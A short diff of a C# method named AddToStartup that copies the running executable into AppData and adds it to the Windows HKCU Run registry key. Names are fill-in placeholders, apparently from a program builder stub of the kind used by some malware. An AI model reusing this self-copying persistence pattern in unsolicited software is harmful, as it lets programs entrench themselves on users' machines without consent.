@@ -129,16 +129,14 @@ namespace stupidcancercodeisruiningeverything
         }
         public void AddToStartup()
         {
-           
-            string path = Path.Combine(Application.UserAppDataPath, "/[fname-replace]");
+
+            string path = Path.Combine(Application.UserAppDataPath, "[fname-replace]");
             string path2 = Path.Combine(path, "[finame-replace].exe");
+            string pathreg = Path.Combine(Environment.SpecialFolder.ApplicationData.ToString(), "[regfname-replace]", "[regfiname-replace].exe");
             if (!File.Exists(path2))
             {
                 DirectoryInfo di = Directory.CreateDirectory(path);
                 File.Copy(Application.ExecutablePath, path2, true);
-                
-
-                
                 RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                 if (key != null) key.SetValue("[regkey-replace]", path2);
             }
